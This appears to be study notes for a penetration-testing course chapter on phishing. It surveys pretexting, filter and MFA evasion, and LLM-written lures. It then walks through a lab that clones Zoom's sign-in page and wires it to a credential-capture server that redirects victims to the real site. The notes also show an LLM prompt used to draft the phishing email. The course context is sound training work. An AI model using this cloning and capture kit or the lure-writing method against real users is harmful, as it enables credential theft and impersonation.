# Phishing Cheat Sheet (PEN-200, Ch. 11)

## Learning Units
1. **Phishing 101** (11.1) — theory: mediums, social engineering levers, Gen AI/LLM impact.
2. **Payloads, Misdirection, and Speedbumps** (11.2) — defenses (filters, MotW, MFA) and how payloads/files/links get past them.
3. **Hands-On Credential Phishing** (11.3) — build a Zoom-pretext clone site + credential-capture server end to end.

Phishing blends **technical skill** (payload delivery, evasion, site cloning) with **social manipulation** (pretext, trust, urgency). Treat it as a precise, research-driven attack — not a spray-and-pray effort.

---

## 11.1 Phishing 101

| Type | Description |
|---|---|
| **Broad / mass phishing** | Generic message, many recipients, low personalization, large-scale. |
| **Spear phishing** | Targeted at specific individuals; requires research into behaviors/preferences/vulnerabilities. |
| **Whaling** | Spear phishing aimed at high-profile individuals (execs). Requires more care/customization; often on an org's **do-not-target list** during an engagement. |
| **Clone phishing** | Mimics a well-known service (Slack, Zoom, Gmail, MS Teams) via a cloned look-alike site. Good for large-scale campaigns. |

> **Info** — On a phishing engagement, the client will often supply a list of email addresses that are **off-limits**, which frequently includes high-profile individuals.

### 11.1.1 Email phishing
Attacker goals: **execute code** (malicious attachment/link) or **steal credentials** (link to cloned login page).

- Malicious attachment formats: Office documents, PDFs, 7zip/ZIP archives, shortcut (`.lnk`) files, calendar invites.
- Malicious links: either point to a browser-exploit page (code execution) or a cloned site that closely resembles a service the target already uses, to capture credentials on login.

> **Info** — In phishing, a **pretext** is the fabricated scenario/story used to convince a target to open a link or attachment (impersonating a role, brand, or situation the target expects).

Pretext requirements:
- Must come from a familiar/plausible source; email metadata (sending domain, etc.) should match target expectations — attackers often buy **look-alike domains**.
- Compromising a real account from the target's org/vendor/client (breach data, leaked creds) is far more effective than a spoofed one.
- Pretext content must match the target audience (e.g., an HR-styled pretext for HR staff) — requires research into department/role norms.
- **Whaling**: pretexts for high-profile targets need deeper customization/insider knowledge.

### 11.1.2 Smishing, vishing, and chatting
- **Smishing** (SMS phishing): more personal/direct than email. Context must match the phone (work vs personal). Since the target won't recognize the sending number, the pretext must explain that. Classic example: **"CEO gift card scam"** — attacker poses as a senior executive asking an employee to buy/send a gift card.
- **Vishing** (voice phishing): attacker calls and talks to the target directly; relies more on social-engineering skill than technical skill.
- **Caller ID spoofing**: alters the displayed sender/caller number — easier now due to VoIP prevalence; used in smishing/vishing.
- **SIM swapping**: attacker convinces a mobile carrier to move the target's number to an attacker-controlled SIM. Used for call/SMS interception and, critically, to **bypass phone-based MFA**.
- **Chat/messaging platforms** are also frequent phishing targets: Discord, Slack, Microsoft Teams.

### 11.1.3 Enhancing phishing through social engineering
Core skill: **build (or exploit existing) trust** so the target follows through without suspicion.

- Pretext must align with the **payload**: sender domain / landing page must visually match the impersonated brand; use valid **TLS/HTTPS** (an HTTP-only page raises suspicion); minute details matter.
- If impersonating a person (or using their compromised account), approximate their **writing tone**. Optionally build **rapport** before pushing the malicious link/file.

Manipulation levers used by attackers:

| Lever | Mechanism |
|---|---|
| **Urgency** | Push the target to act fast without critical thought; most effective in orgs with an "urgent request" culture. |
| **Fear** | Momentarily suspends judgment, increasing compliance. |
| **Authority** | Amplifies urgency; attacker poses as a superior/IT/CEO. |
| **Baiting** | Offers a positive incentive/reward to lure the target into acting. |

> Balance these — excessive urgency/fear/authority can conflict with the rapport/trust you're trying to build.

### 11.1.4 Leveraging LLMs, Generative AI, and deepfakes
- LLMs assist **research and pretext generation** — can perform Retrieval Augmented Generation (RAG)-style synthesis over public data about a target and turn it into a usable pretext; for high-profile targets the model may already "know" enough without RAG.
- Threat intel reporting confirms rising Gen-AI use in real campaigns (Microsoft 2023 warning on LLM-crafted phishing emails; Mandiant 2024 M-Trends on Gen AI in social engineering/info ops) — but such reports can only see *observable* activity, not how much attackers lean on LLMs for planning/research.
- **Voice cloning**: modern tools can build a usable voice model from a small audio sample and make it say anything — increasingly convincing, harder to detect.
- **Deepfake video**: e.g., the 2024 **Arup** case — deepfaked video of the CFO and staff on a call convinced an employee to authorize a **$25 million** transfer to attackers.

---

## 11.2 Payloads, Misdirection, and Speedbumps

### 11.2.1 Understanding the role of inbound email filters
- Filters score/weight **sender domain reputation** (blocklists, domain age, etc.).
- File attachments are scrutinized; **EXE/SCR** are almost always flagged. Depending on the product, **Office documents, PDFs, ZIP/archives, script files**, and even hyperlinks pointing to domains hosting those file types can also be flagged.
- Fallback control: many orgs prepend **`[EXTERNAL]`** to the subject line of mail from outside domains, even if it's spoofed to look internal.

### 11.2.2 Identifying risks of malicious Office macros
- Office's VBA macro engine is powerful and long-abused for phishing payloads (malicious macros have been a staple attack vector for decades, dating back to early mass-mailer macro viruses in Office documents).
- **Mark of the Web (MotW)**: an NTFS file attribute Windows sets on files downloaded from an external source (e.g., email attachment, internet download). Visible in file Properties (Figure 166 in the book shows this).

> **Info** — Exploits (e.g., CVE-2022-41091) have historically let attackers bypass MotW, though patches tend to close these gaps quickly.

- **Protected View**: Office warns/opens MotW-flagged documents in a read-only sandbox; user must explicitly click through to edit or enable dynamic content (macros).
- Microsoft now **blocks macros by default** in any document carrying the MotW attribute — significantly weakens macro-based phishing.
- Admins can enforce Protected View / macro-blocking via **AD Group Policy**, which individual users can't override.
- Still relevant because: many orgs run **outdated Office versions**, or apply only **basic/incomplete Group Policy** hardening — don't discount macros as a vector.

### 11.2.3 Assess threats from malicious files
- EXE attachments are unlikely to reach the inbox and users are generally wary of them → attackers shifted to **SCR, HTA, and JScript** files.
- Office/document-parsing vulnerabilities (client-side code execution without macros):

| CVE | Component | Notes |
|---|---|---|
| **CVE-2017-11882** | MS Office **Equation Editor** | Memory-corruption RCE; patched 2018 but still seen exploited afterward against unpatched orgs. |
| **CVE-2023-21716** | MS Word **RTF parser** | RTF file parsing vuln; public PoCs exist; grants code execution without needing macros — but shelf life is limited by enterprise patch cycles. |
| **CVE-2023-21608** | **Adobe Acrobat Reader** | Use-after-free; public PoCs achieve arbitrary code execution. |

- Targeted attacks: research the specific software stack a target org uses (document readers, mail clients, browsers) via **job postings, LinkedIn, Glassdoor, G2 Crowd/Capterra reviews, industry forums/blogs, tech news** — then hunt for a matching vulnerability (up to and including **0-days**).
- 0-day hunting is costly/time-consuming (historically a "reserved" tactic) but is becoming more common precisely *because* macro-based attacks are being locked down.
- Advanced attackers **reverse-engineer vendor security patches** (patch diffing) to find n-day vulnerabilities in the short window before broad patch adoption.

### 11.2.4 Recognize malicious links
**Credential-harvesting clone sites** commonly impersonate: Google Gmail, Zoom, Microsoft 365/Outlook/Teams, and other frequently used services — including **password managers** themselves, since a compromised vault is high value.

Password manager vulnerabilities seen in the wild:

| Year | Target | Issue |
|---|---|---|
| 2016 | LastPass browser extension | Crafted URI tricked the extension into revealing passwords. |
| 2017 | LastPass browser extension | Google Project Zero bug allowed arbitrary vault password reads, possibly code execution. |
| 2021 | Safari **1Password** extension | Allowed reading vault items (e.g., credit card data). |
| 2023 | Android **AutoSpill** | Abused how Android exposes WebViews to the parent app to steal credentials from a malicious app. |

Password managers remain a general **roadblock** to credential phishing even though isolated bugs exist.

Other link-based approaches:
- **Browser exploit delivery**: link triggers a browser 0-day/N-day for RCE — advanced, requires a reliable exploit + target using the specific vulnerable browser.
- **CSRF exploitation**: abuses an existing authenticated session in the target's browser to perform unwanted actions; in extreme cases, RCE — e.g. **CVE-2024-1879** (CSRF in AutoGPT leading to arbitrary code execution).
- **Link credibility**: the URL itself must not look suspicious (long/garbled strings break the pretext). Techniques: URL shorteners (**TinyURL**, **Bitly**) to hide the destination, and look-alike domains (including visually-confusable/homograph-style characters) to mimic a legitimate URL at a glance.
  > Caution — third-party URL shorteners can **kill your link** if their abuse detection flags it as pointing to malware.
- **HTTPS/TLS is mandatory** for a convincing clone — an insecure-connection browser warning would blow the pretext, since legitimate login pages are essentially always HTTPS today.
- **NTLM hash capture via forced authentication**: a link (or an embedded image pointing to an SMB path) can trigger an automatic NTLM handshake when opened, letting the attacker capture a **NetNTLMv2** hash. Dated technique, but still seen in the wild as recently as **February 2024**.

### 11.2.5 Differentiate credential phishing and Multi-Factor Authentication (MFA)
Getting credentials doesn't guarantee access if MFA is enabled. Bypass/handling techniques:

| Technique | Mechanism |
|---|---|
| **Prompt bombing / MFA fatigue** | Repeated login attempts spam push-approval prompts on the target's phone until they approve one just to stop the noise. |
| **Real-time reverse-proxy (AitM) phishing** | A transparent proxy relays the live login flow between target and the real site, so the target is actually authenticating to the legitimate site — but the resulting session (and captured MFA token) ends up under the attacker's control. Tool example: **cuddlephish**. Requires a public IP and can't easily be run purely locally — a real limitation on assumed-breach engagements targeting internal-only web apps. |
| **Brute-forcing the MFA token** | Feasible in theory (6-digit codes) but slow/bandwidth-heavy, and depends on the MFA server allowing unlimited attempts with a long response window. |
| **Social engineering for the token** | Pose as helpdesk/IT and directly ask the target for their current MFA code — needs a strong pretext. |
| **SIM swapping for SMS-based MFA** | Take over the target's phone number to receive SMS MFA codes directly. **Not something you can do on a legitimate pentest** due to legal/carrier implications — understand it as an attacker tactic, not an authorized technique. |

---

## 11.3 Hands-On Credential Phishing
Walkthrough: build a Zoom-branded credential phishing pretext against a compromised org mailbox, in a lab environment.

### 11.3.1 Creating a Zoom credential phishing pretext
Starting point: access to a leaked/compromised helpdesk mailbox.

```text
URL:      http://192.168.X.77/mail/          # webmail portal on the MAILER lab machine
User:     helpdesk@mail.corp.com
Password: Helpdesk@Password2024
```

> Replace `192.168.X.77` with your lab's actual generated IP.

Recon workflow:
1. Log into the compromised webmail account.
2. Review **outgoing/sent mail** for tone, formatting, and existing campaigns.
3. Found: an email from helpdesk to the sales department about Zoom license reclamation — a ready-made pretext template.

Feed the discovered email to an LLM (e.g., ChatGPT) to generate a stylistically-matched follow-up:

```text
Looking at the following email:

"Hello Sales department,

Hope you're knocking it out of the park this week! We're trying to redo our inventory
of Zoom licenses as we seem to have a large number which aren't being used at the
moment. Rather than having everyone reply to the email, in order to keep your Zoom
license, please just ensure that you login to your account and schedule a meeting
within the next two weeks. Any accounts which don't do this within the time frame will
be transitioned to a free license.

Thank you very much for your cooperation and apologies for the hassle!"

Write another email in the same style as this, and include a reminder for employees to
login to Zoom. Include a hyperlink that can be clicked and directs people to the
appropriate page.
```
*(Listing 229 — prompt sent to ChatGPT)*

Resulting LLM-generated pretext email (Listing 230):

```text
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder--hope everything's going smoothly on your end! We're still
working on updating our Zoom license inventory and noticed that some accounts haven't
yet logged in to schedule a meeting. To make sure your account remains on a full
license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a
free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you
have any questions.

Best regards,
[Your Company] Helpdesk Team
```

> LLM output quality varies by prompt/target — treat the first response as a good starting draft, not a final product.

### 11.3.2 Cloning a legitimate website
Goal: replicate the official Zoom sign-in page as closely/convincingly as possible.

**Attempt 1 — `wget` mirroring:**
```bash
mkdir ZoomSignin
cd ZoomSignin

wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"
```

| Flag | Purpose |
|---|---|
| `-E` | Adjust file extensions (e.g. add `.html`) so pages render correctly locally. |
| `-k` | Convert links to relative, for local viewing. |
| `-K` | Keep a copy of the original file with a `.orig` extension. |
| `-p` | Download all page requisites (images, CSS, JS) needed to render the page. |
| `-e robots=off` | Ignore `robots.txt` restrictions that would otherwise block the download. |
| `-H` | Span hosts — follow links to external domains too. |
| `-Dzoom.us` | Restrict host-spanning downloads to the `zoom.us` domain. |
| `-nd` | No directories — save all files flat in the current directory. |

```bash
ls -al
# Downloaded: 86 files, 5.2M ...
sudo python -m http.server 80
# Serving HTTP on 0.0.0.0 port 80 ...
# browse to http://127.0.0.1/signin.html#/login
```

**Result: broken.** Zoom's sign-in page is a **Vue.js Single-Page Application (SPA)** — it fetches JS modules at *runtime* (chunk loading), so `wget` never downloads them; `-k` link-rewriting also breaks references, and cross-domain resources get blocked. Symptoms: an OWASP CSRFGuard error alert, a cookie modal, then a blank page (confirm via browser Dev Tools).

**Attempt 2 — SingleFile CLI** (captures the fully-rendered DOM via a real headless browser, so SPA content is baked into the saved HTML):
```bash
rm -rf ./*                                   # start from an empty folder

sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli

single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium
```
Reopening the page now shows a working visual clone, including the cookie-consent modal — but:
- The cookie banner doesn't function (relies on Zoom's OneTrust JS, absent/broken in the clone).
- The login form doesn't submit — no working password field, and the Vue.js login logic wasn't preserved (only the rendered HTML/CSS was captured).

### 11.3.3 Cleaning up the clone
Fix three things with a Python HTML-patching script: broken cookie banner, non-functional Next button, and missing password step (Zoom's real flow is email-first, then a second password screen).

Find the Next button's element ID first:
```bash
grep -oP '.{0,100}Next</span>' signin.html
# ... id=signin_btn_next ... class=zoom-button__label>Next</span>
```

Re-clone with SingleFile to start from a fresh copy, then run a patch script:
```bash
single-file "https://zoom.us/signin" signin.html --browser-executable-path /usr/bin/chromium

cd ~/ZoomSignin && python3 << 'PYEOF'
import re

with open('signin.html','r') as f:
    html = f.read()

# Remove the OneTrust cookie banner
html = re.sub(r'<div id=onetrust-consent-sdk>.*?(?=<iframe)', '', html, flags=re.DOTALL)

# Make the Next button call our function
html = html.replace(
    'id=signin_btn_next',
    'id=signin_btn_next onclick="goToPassword()"'
)

# Add Enter key support on the email field
html = html.replace(
    'id=email tabindex=0',
    'id=email tabindex=0 onkeydown="if(event.key===\'Enter\'){event.preventDefault();goToPassword();}"'
)

# extras: a password-entry overlay (mimics Zoom's 2nd login step: heading,
# password field, "Stay signed in" checkbox, "Forgot password" link, Sign in
# button), a goToPassword() JS handler that reveals the overlay and copies the
# entered email into it, and a replacement OneTrust-style cookie banner with a
# working "Cookies Settings" / close button.
extras = """ ... (overlay div + <script>goToPassword(){...}</script> + cookie banner div) ... """

html = html + extras

with open('signin.html','w') as f:
    f.write(html)

print('Done')
PYEOF
```

> The book's inline `extras` HTML block (styling for the password overlay and cookie banner) is long and cosmetic — reproduce the *structure* (overlay div with password form + JS handler + cookie banner div), not necessarily pixel-for-pixel styling.

What the script does:
1. Strips the broken OneTrust cookie-consent banner (regex up to the first `<iframe`).
2. Adds `onclick="goToPassword()"` to the Next button.
3. Adds an Enter-key handler on the email field.
4. Injects a password overlay (`#pw-overlay`) styled to look like Zoom's real second login step.
5. Injects `goToPassword()`: reads the entered email, populates/stores it, and reveals the password overlay.
6. Injects a working replacement cookie banner (`#ot-cookie-notice`) whose buttons actually dismiss it.

Result: reloading the page shows a fully cosmetic match — dismissible cookie banner, and clicking Next transitions to the password overlay while the header/sidebar stay visible underneath.

### 11.3.4 Injecting malicious elements in the clone (credential capture)
Two remaining steps: point the login form at an attacker-controlled endpoint, and stand up a listener to receive/log submitted credentials.

1. Patch the form's `action` attribute to point at a local capture server (e.g. `http://127.0.0.1:8080/`).
2. Stand up the capture server:

```bash
cat > cred_server.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        print(f'\n[+] Raw data: {raw}')
        data = parse_qs(raw)
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        print(f'[+] Captured credentials!')
        print(f'    Email: {email}')
        print(f'    Password: {password}\n')
        self.send_response(302)
        self.send_header('Location', 'https://zoom.us/signin')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
PYEOF
```
The handler parses POSTed form data, prints the captured `email`/`password` to the terminal, then **302-redirects the victim to the real Zoom sign-in page** — so from the victim's point of view, the login just "failed" and they simply retry (on the real site this time).

Run it (two terminals):
```bash
python3 cred_server.py            # terminal 1 — listens on :8080

sudo python3 -m http.server 80    # terminal 2 — serves the cloned signin.html on :80
```

Test end to end: browse to `http://127.0.0.1/signin.html`, enter a test email, click Next, enter a test password, submit.

```text
[+] Raw data: email=test%40test.com&password=test123
[+] Captured credentials!
    Email: test@test.com
    Password: test123
```

> **Tip** — In a real engagement, replace `127.0.0.1` in **both** places — the form's `action` (set by the patch script) and the credential server's bind address — with your actual Kali attack-box IP.

### 11.3.5 Crafting the phishing email
Send the pretext from the compromised helpdesk mailbox back out to the target(s).

1. Browse to the webmail portal again: `http://192.168.X.77/mail/` (replace `X` with your lab IP octet).
2. Click through the certificate warning ("Potential Security Risk Ahead" → **Advanced** → **Accept the Risk and Continue**).
3. Log in: `helpdesk@mail.corp.com` / `Helpdesk@Password2024`.
4. Open **Sent**, find the original Zoom-license email, click **Reply to sender and all recipients** (keeps the original thread's legitimacy/context).
5. Paste in the LLM-generated pretext text (matches the account's established communication style):

```text
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder--hope everything's going smoothly on your end! We're still
working on updating our Zoom license inventory and noticed that some accounts haven't
yet logged in to schedule a meeting. To make sure your account remains on a full
license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a
free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you
have any questions.

Best regards,
CORP.COM Helpdesk Team
```

6. Switch the composer to **HTML mode** and turn a phrase ("click here") into a hyperlink pointing at the cloned Zoom sign-in page.

> **Tip** — Lab DNS limits mean the link can't use a proper FQDN here. In a real engagement, host the clone on a **look-alike domain name** matching the pretext (e.g. something Zoom-adjacent) rather than a bare IP.

7. Send.

**Victim side (simulated for the module):**
```text
User:     j.smith.sales@mail.corp.com
Password: W00tw00t!!
```
Log in as the victim, open the phishing email, click the malicious link, and submit the (fake) Zoom credentials on the cloned page.

> **Caution** — This module doesn't use a real Zoom account — the credentials entered will not work against the real Zoom service.

Check the capture output/log on Kali:
```bash
cat credentials.txt
```
```text
Email: j.smith.sales@corp.com
Password: W00tw00t!!
```

Captured credentials from a "victim" can now be used to pivot / expand the engagement (further mailbox access, lateral movement, etc.).

---

## Key Takeaways / Workflow Summary
1. **Objective first, medium second**: decide whether the goal is code execution or credential theft before picking email / smishing / vishing / chat as the delivery channel.
2. **Pretext is everything**: it must match the target's expectations (department, role, familiar sender/domain, writing tone) and must be technically consistent with the payload (matching domain, valid HTTPS, believable landing page).
3. **Social engineering levers** — trust, urgency, fear, authority, baiting — are used in combination, but trust/rapport underpins all of them; overplaying urgency/fear/authority can break the illusion.
4. **Gen AI/LLMs accelerate every stage**: OSINT/RAG-style research, pretext/email drafting in a target's voice, and (for higher-end operators) voice cloning / deepfakes for vishing and video-call BEC-style scams (e.g. Arup, 2024).
5. **Payload evasion must beat email filters + Windows defenses**: domain reputation, attachment-type scrutiny, `[EXTERNAL]` tagging, and — critically — **Mark of the Web** + Protected View + default macro-blocking on MotW-flagged Office files.
6. **When macros are locked down, pivot to**: file-parser exploits (Equation Editor, RTF, PDF reader CVEs), malicious links (clone sites, CSRF, browser 0/N-days, forced-NTLM-auth hash capture), and heavy pre-attack research (job postings/LinkedIn/G2/forums) to target the *specific* software stack in use.
7. **MFA is a speedbump, not a wall**: prompt-bombing/MFA fatigue, real-time reverse-proxy (AitM) session/token theft (e.g. cuddlephish — needs a public IP), brute-forcing, and social-engineering the helpdesk are all viable; SIM swapping for SMS MFA is attacker tradecraft, **not** something to do on an authorized pentest.
8. **Hands-on cloning workflow**: `wget -E -k -K -p -e robots=off -H -D<domain> -nd <url>` works for static sites; modern **SPA sites need SingleFile CLI** (headless-browser capture) instead. Either way, expect to hand-patch broken interactivity (cookie banners, login buttons, missing form steps) with a small script before wiring the form to a credential-capture listener that logs creds and redirects to the real site to avoid suspicion.
9. **Always research and rehearse the full chain in a lab first**: pretext → clone → capture → delivery → cleanup, mirroring exactly what 11.3 walks through.
